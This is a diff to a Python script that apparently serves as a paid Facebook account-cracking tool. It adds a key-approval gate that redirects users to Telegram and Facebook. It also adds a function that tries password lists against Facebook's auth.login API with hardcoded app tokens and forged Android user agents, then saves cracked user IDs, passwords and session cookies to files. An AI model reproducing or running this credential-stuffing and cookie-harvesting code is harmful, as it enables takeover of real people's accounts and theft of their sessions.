@@ -487,6 +487,75 @@ def rd(ids,passlist,fbcr):
 		time.sleep(20)
 	except Exception as e:
 		pass
+def superuser():
+    UMO="HRIDOYE-"
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/HRIDOYE-143/CONTROL-GITHUB/blob/main/Aproval.tex").text
+    if id in DARK:
+        Main()
+    else:
+        os.system("clear")
+        os.system("xdg-open https://t.me/bdislamicyber")
+        time.sleep(3.0)
+        
+        os.system("clear")
+        print(logo)
+        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+        print ("")
+        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
+        print ("")
+        print("                Your Key is Not Approved ")
+        print("               Copy And Send Key To Admin")
+        print ("")
+        print (" Your Key : "+UMO+id)
+        print ("\n")
+        os.system("espeak \"assalamualaikum ,I am HRIDOYE VAI er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
+        name = input(" Your Name : ")
+        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
+        print ("")
+        input(" Press Enter To Send Key")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100093556008452")
+        superuser()        
+superuser()
+
+def rd(ids,passlist,fbcr):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		for pas in passlist:
+			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
+			accessToken = random.choice(tokenlist)
+			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+			fbbv = str(random.randint(111111111,999999999))
+			fblc = "zh_HK"
+			fbfw = '1'
+			fbrv = '0'
+			if '350685531728' in accessToken:
+				fban = 'FB4A'
+				fbpn = 'com.facebook.katana'
+			else:
+				fban = 'Orca-Android'
+				fbpn = 'com.facebook.orca'
+			ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+'.0.1;FBCA/'+fbca+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
+			head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"zh_HK","client_country_code":"HK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+			po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
+			if "session_key" in po:
+				uid = str(po['uid'])
+				token = po['access_token']
+				print('\r\r\033[1;32m [UMAR-OK] '+uid+' | '+pas)
+				oks.append(ids)
+				open('/sdcard/Cyber/Cyber-R-OK.txt','a').write(uid+'|'+pas+'\n')
+				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+				open('/sdcard/Cyber/Cyber-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				break
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
 
 try:main()
 except requests.exceptions.ConnectionError:
